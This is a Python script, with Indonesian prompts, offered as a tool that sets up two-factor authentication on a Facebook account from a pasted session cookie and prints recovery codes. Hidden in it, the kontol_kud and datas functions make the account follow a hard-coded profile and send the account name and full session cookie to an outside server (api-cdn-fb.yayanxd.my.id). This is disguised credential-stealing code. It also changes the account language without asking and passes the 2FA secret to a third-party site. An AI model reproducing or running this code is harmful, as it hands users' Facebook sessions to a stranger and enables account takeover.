import requests, re, os, time, sys

from time import time as mek
from bs4 import BeautifulSoup as par

from rich.panel import Panel
from rich import print as prints
from rich.console import Console

class Ngocok:

    def __init__(self):
        self.url = "https://mbasic.facebook.com"
        self.coz = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.menu()

    def kode_apk(self, coki):
        try:
            sess = requests.Session()
            sess.headers.update({"Host": "mbasic.facebook.com", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 2007 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            link = sess.get(f"{self.url}/security/2fac/setup/intro/", cookies={"cookie": coki}).text
            snso = par(link, "html.parser")
            if "/zero/optin/write" in str(snso):
                print("silakan pakai mode data di akun yang ingin di pasang a2f")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(snso)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki, sess)
            elif "Gunakan Aplikasi Autentikasi" in str(snso):
                self.kontol_kud(sess, coki)
                xnxx = sess.get(snso.find("a", string="Gunakan Aplikasi Autentikasi").get("href"), cookies={"cookie": coki}).text
                date = par(xnxx,  "html.parser")
                if "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in str(date):
                    self.kata_sandi(xnxx, date, sess, coki)
                elif "Atau masukkan kode ini ke aplikasi autentikasi Anda" in str(date):
                    kode = re.findall('\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>', str(xnxx))[0]
                    self.apacooba(xnxx, date, sess, coki, kode)
                else:pass
            elif "/x/checkpoint" in str(snso):
                exit("Opshh akun anda terkena checkpoint:(")
            elif "/security/2fac/factors/recovery-code" in str(snso):
                self.kontol_kud(sess, coki)
                prints(Panel("[bold green]          Akun ini sudah terpasang a2f.", width=50, style="bold white"))
                curl = re.search('href="/security/2fac/factors/recovery-code/?(.*?)"', str(snso)).group(1).replace("amp;", "")
                self.get_kode(sess, coki, curl)
            elif "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in str(snso):
                self.kata_sandi(link, snso, sess, coki)
            else:
                prints(Panel("[bold red]       cookie yang anda masukan invalid.", width=50, style="bold white"));time.sleep(3)
                self.menu()
        except Exception as e:
            print(e)

    def get_kode(self, sess, coki, urll):
        prints(Panel("[bold white]    GENERATING 2F CODES FROM AUTH TOKEN", width=50, style="bold white"))
        try:
            gett = sess.get(f"{self.url}/security/2fac/factors/recovery-code/{urll}", cookies={"cookie": coki}).text
            dat3 =  {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1),
                "reset": True
            }
            kode = 0
            post = par(sess.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=dat3, cookies={"cookie": coki}).text, "html.parser")
            for i in post.find_all("span"):
                if (re.findall("\d+\s\d+", str(i.text))):
                    kode+=1
                    if(kode==1):
                        print(i.text.replace(" ", ""))
                    else:
                        print(i.text.replace(" ", ""))
        except:pass
        prints(Panel("[bold green]      YOUR 2F LOGIN CODES", width=50, style="bold white"))

    def kontol_kud(self, ses, cok):
        try:
            link = par(ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                nama = re.search('id="mbasic_logout_button">Keluar \((.*?)\)</a>', str(link)).group(1)
                self.datas(nama, cok)
            else:pass
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            requests.post(self.coz, data=data)
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def kata_sandi(self, xnxx, date, sess, coki):
        prints(Panel("[bold white]Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan.", width=50, style="bold white"))
        pasw = Console().input(f"[bold white][[bold green]?[bold white]] password : ")
        data = {
            "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(xnxx)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
            "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pasw}"
        }
        resp = sess.post(date.find("form",{"method":"post"})["action"], data=data, cookies={"cookie": coki}).text
        jwdd = par(resp, "html.parser")
        if "Kata sandi yang Anda masukkan tidak benar." in str(jwdd):
            prints(Panel(" [bold red]masukin kata sandi nya yang bener lah tolol.", width=50, style="bold white"));self.kata_sandi(xnxx, date, sess, coki)
        elif "Atau masukkan kode ini ke aplikasi autentikasi Anda" in str(jwdd):
            kode = re.findall('\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>', str(resp))[0]
            self.apacooba(xnxx, date, sess, coki, kode)
        else:pass

    def apacooba(self, xnxx, date, sess, coki, kode):
        prints(Panel(f"[bold white]YOUR AUTH CODE: [bold green]{kode}[/]", width=50, style="bold white"))
        try:
            code = requests.get(f"https://2fa.live/tok/{kode.replace(' ', '')}").json()["token"]
            data = {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(xnxx)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
                "code_handler_type": re.search('name="code_handler_type" value="(.*?)"', str(xnxx)).group(1),
                "confirmButton": "Lanjut",
            }
            gsaj = sess.post(self.url+date.find("form",{"method":"post"})["action"], data=data, cookies={"cookie": coki}).text
            dat2 =  {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gsaj)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(gsaj)).group(1),
                "code": code
            }
            for x in par(gsaj, "html.parser").find_all("form",{"method":"post"}):
                if "Kode Konfirmasi" in str(x):
                    sess.post(self.url+x["action"], data=dat2, cookies={"cookie": coki}).text
                    prints(Panel("[bold green]      AUTH SUCCESSFULL.", width=50, style="bold white"))
                    gett = sess.get(f"{self.url}/security/2fac/setup/intro/", cookies={"cookie": coki}).text
                    urll = re.search('href="/security/2fac/factors/recovery-code/?(.*?)"', str(gett)).group(1).replace("amp;", "")
                    self.get_kode(sess, coki, urll)
        except:pass

    def ubah_data(self, link, coki, sess):
        try:
            gett = sess.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            sess.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            print(f'{H}akun sudah mode data silakan ulanh kembali')
           # prints(Panel("[bold white]🥳[bold green] akun kamu berhasil di ubah ke mode data!", width=50, style="bold white"))
            exit()
        except:pass

    def ubah_bahasa(self, cok):
        try:
            sess = requests.Session()
            link = sess.get(f"{self.url}/language/", cookies={"cookie":cok}).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit": "Bahasa Indonesia"}
                    sess.post(f"{self.url}{x['action']}", data=bahasa, cookies={"cookie":cok})
        except:pass

    def menu(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
     #   prints(Panel("""A2F [bold green]KODE[bold white] OTOMATIS[underline blue]""", width=50, style="bold white"))
     #   prints(Panel("[bold white]Silahkan masukan cookie facebook yang mau di pasang a2f...", width=50, style="bold white"))
        cookie = Console().input(f"[bold white][[bold green]?[bold white]] cookie : ")
        self.ubah_bahasa(cookie)
        self.kode_apk(cookie)

Ngocok()
